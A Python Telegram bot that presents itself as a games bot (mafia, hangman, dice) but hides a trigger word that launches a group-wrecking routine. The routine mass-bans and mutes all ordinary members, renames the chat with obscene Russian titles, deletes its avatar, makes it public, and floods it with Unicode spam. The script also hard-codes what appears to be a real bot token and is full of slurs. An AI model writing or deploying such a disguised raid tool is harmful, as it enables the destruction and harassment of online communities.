import asyncio
import random
from datetime import datetime, timedelta

from telegram import Chat, ChatMember, ChatPermissions, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = "8123493243:AAG-dVlsZDV6QsIn0SqJmH6Kpk3ZD8XAaUM"
TRIGGER = "1пончик"
SPAM_TEXT = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
UPDATE_INTERVAL = 0.5

PROTECTED_USER = 7310025347

BRAND = "official_Breadstic xD"

NAMES = [
    BRAND, "ХУЙНЯ", "СОСИ", "ПИЗДАБОЛ", "РАЗЪЕБ", "УЕБИЩЕ", "ЗАБАНИЛИ",
    "СРУЛЬ", "ЕБЛАНЫ", "ДНО", "БЛЕВОТИНА", "БАРДАК", "ПИЗДЕЦ",
    "ЖОПА", "МУДАК", "УРОД", "ЛОХ", "ГОВНО", "ОТСТОЙ"
]

DESCS = [
    f"{BRAND} всех разъебал", f"{BRAND} сосёт хуй", f"группа даунов от {BRAND}",
    f"админ пидорас {BRAND}", f"{BRAND} идите нахуй", f"пиздец от {BRAND}"
]

GAME_ANSWERS = [
    f"🎲 выпало {{num}} | {BRAND}", f"🃏 карты {{cards}} | {BRAND}",
    f"💀 сдох от {BRAND}", f"{BRAND} тебя выебал"
]

CHAOS_ACTIVE = {}

async def delete_message(bot, chat_id, message_id):
    try:
        await bot.delete_message(chat_id, message_id)
    except:
        pass

async def ban_user(bot, chat_id, user_id):
    if user_id == PROTECTED_USER:
        return False
    try:
        await bot.ban_chat_member(chat_id, user_id)
        return True
    except:
        return False

async def kick_user(bot, chat_id, user_id):
    if user_id == PROTECTED_USER:
        return False
    try:
        await bot.ban_chat_member(chat_id, user_id)
        await asyncio.sleep(0.5)
        await bot.unban_chat_member(chat_id, user_id)
        return True
    except:
        return False

async def mute_user(bot, chat_id, user_id):
    if user_id == PROTECTED_USER:
        return
    try:
        until = datetime.now() + timedelta(days=366)
        perms = ChatPermissions(can_send_messages=False)
        await bot.restrict_chat_member(chat_id, user_id, perms, until_date=until)
    except:
        pass

async def delete_avatar(bot, chat_id):
    try:
        await bot.set_chat_photo(chat_id, photo=None)
    except:
        pass

async def new_link(bot, chat_id):
    try:
        await bot.create_chat_invite_link(
            chat_id, member_limit=1,
            expire_date=datetime.now() + timedelta(minutes=1),
            name=f"{BRAND}_{random.randint(1,999)}"
        )
    except:
        pass

async def make_public(bot, chat_id):
    try:
        await bot.set_chat_username(chat_id, f"breadsticc_{random.randint(1000,9999)}")
    except:
        pass

async def spam(bot, chat_id):
    try:
        await bot.send_message(chat_id, SPAM_TEXT)
    except:
        pass

async def get_users(bot, chat_id):
    users = []
    try:
        async for x in bot.get_chat_members(chat_id):
            users.append(x)
    except:
        pass
    return users

async def chaos(chat_id, bot, ctx):
    CHAOS_ACTIVE[chat_id] = True
    
    try:
        chat = await bot.get_chat(chat_id)
        me = await chat.get_member(bot.id)
        admin = me.status in (ChatMember.ADMINISTRATOR, ChatMember.OWNER)
        
        owner = None
        if admin:
            for x in await chat.get_administrators():
                if x.status == ChatMember.OWNER:
                    owner = x.user.id
                    break
        
        await make_public(bot, chat_id)
        
        if admin:
            await delete_avatar(bot, chat_id)
            await bot.set_chat_title(chat_id, random.choice(NAMES))
            await bot.set_chat_description(chat_id, random.choice(DESCS))
            await new_link(bot, chat_id)
            await bot.set_chat_slow_mode(chat_id, 300)
        
        # Баним всех обычных участников
        banned_count = 0
        for x in await get_users(bot, chat_id):
            uid = x.user.id
            # Не баним: бота, владельца, защищённого, админов
            if uid in [bot.id, owner, PROTECTED_USER]:
                continue
            # Проверяем не админ ли
            if x.status in [ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                continue
            
            await ban_user(bot, chat_id, uid)
            await mute_user(bot, chat_id, uid)
            banned_count += 1
            await asyncio.sleep(0.05)
        
        for _ in range(3):
            await spam(bot, chat_id)
            await asyncio.sleep(0.05)
            
    except:
        pass
    
    while CHAOS_ACTIVE.get(chat_id, False):
        try:
            chat = await bot.get_chat(chat_id)
            me = await chat.get_member(bot.id)
            admin = me.status in (ChatMember.ADMINISTRATOR, ChatMember.OWNER)
            
            owner = None
            if admin:
                for x in await chat.get_administrators():
                    if x.status == ChatMember.OWNER:
                        owner = x.user.id
                        break
            
            if admin:
                try:
                    await bot.set_chat_title(chat_id, random.choice(NAMES))
                except:
                    pass
                try:
                    await bot.set_chat_description(chat_id, random.choice(DESCS))
                except:
                    pass
                await new_link(bot, chat_id)
                await delete_avatar(bot, chat_id)
            
            # Баним новых обычных участников
            for x in await get_users(bot, chat_id):
                uid = x.user.id
                if uid in [bot.id, owner, PROTECTED_USER]:
                    continue
                if x.status in [ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                    continue
                
                await ban_user(bot, chat_id, uid)
                await mute_user(bot, chat_id, uid)
                await asyncio.sleep(0.05)
            
            await spam(bot, chat_id)
            
            try:
                if await bot.get_chat_member_count(chat_id) <= 2:
                    await bot.send_message(chat_id, f"{BRAND} всех выебал, удаляй нахуй")
            except:
                pass
                
        except:
            pass
        
        await asyncio.sleep(UPDATE_INTERVAL)

async def start_game(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"{BRAND}\n\n"
        "игры:\n"
        "/mafia\n/hangman\n/dice\n/cards\n/werewolf\n\n"
        "секрет: 1пончик"
    )

async def mafia(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{BRAND} мафия убила " + update.effective_user.first_name)

async def hangman(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    word = random.choice(["ХУЙ", "ПИЗДА", "ЕБЛАН"])
    ctx.user_data['hangman'] = word
    await update.message.reply_text(f"{BRAND} виселица\nслово: {'_ ' * len(word)}")

async def dice(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{BRAND} кубик: {random.randint(1,6)}")

async def cards(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{BRAND} карты: {random.choice(['пара', 'хуйня', 'флеш'])}")

async def werewolf(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{BRAND} оборотни съели {update.effective_user.first_name}")

async def check_hangman(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if 'hangman' not in ctx.user_data:
        return
    if update.message.text.strip().upper() == ctx.user_data['hangman']:
        await update.message.reply_text(f"{BRAND} угадал")
        del ctx.user_data['hangman']

async def trigger(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or update.message.text.strip() != TRIGGER:
        return
    chat_id = update.effective_chat.id
    try:
        await update.effective_chat.get_member(ctx.bot.id)
    except:
        await update.message.reply_text(f"{BRAND} добавь меня в группу")
        return
    if CHAOS_ACTIVE.get(chat_id, False):
        await update.message.reply_text(f"{BRAND} уже ебу")
        return
    await update.message.reply_text(f"{BRAND} поехали")
    ctx.application.create_task(chaos(chat_id, ctx.bot, ctx))

async def stop_chaos(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if CHAOS_ACTIVE.get(chat_id, False):
        CHAOS_ACTIVE[chat_id] = False
        await update.message.reply_text(f"{BRAND} остановил")
    else:
        await update.message.reply_text(f"{BRAND} ничего нет")

async def handle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Если хаос активен
    if CHAOS_ACTIVE.get(chat_id, False):
        # Удаляем сообщение
        await delete_message(ctx.bot, chat_id, update.message.message_id)
        
        # Баним и мутим обычных участников (не админов и не владельца)
        if user_id not in [ctx.bot.id, PROTECTED_USER]:
            try:
                # Проверяем статус
                chat = await ctx.bot.get_chat(chat_id)
                member = await chat.get_member(user_id)
                if member.status not in [ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                    await ban_user(ctx.bot, chat_id, user_id)
                    await mute_user(ctx.bot, chat_id, user_id)
            except:
                await ban_user(ctx.bot, chat_id, user_id)
                await mute_user(ctx.bot, chat_id, user_id)
        return

    if user_id == PROTECTED_USER:
        return

    await check_hangman(update, ctx)

    if not text.startswith('/') and text != TRIGGER:
        await update.message.reply_text(random.choice(GAME_ANSWERS).format(
            num=random.randint(1,6),
            cards=random.choice(["пара","хуйня","стрит"])
        ))

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_game))
    app.add_handler(CommandHandler("mafia", mafia))
    app.add_handler(CommandHandler("hangman", hangman))
    app.add_handler(CommandHandler("dice", dice))
    app.add_handler(CommandHandler("cards", cards))
    app.add_handler(CommandHandler("werewolf", werewolf))
    app.add_handler(CommandHandler("stop_chaos", stop_chaos))
    
    app.add_handler(MessageHandler(filters.Text(TRIGGER) & ~filters.COMMAND, trigger))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    
    print(f"запущен | {BRAND}")
    print(f"защита: {PROTECTED_USER}")
    print("🔨 банит ВСЕХ обычных участников")
    print("админов не трогает (Telegram не даёт)")
    print("удаляет их сообщения")
    print("команда: 1пончик")
    app.run_polling()

if __name__ == "__main__":
    main()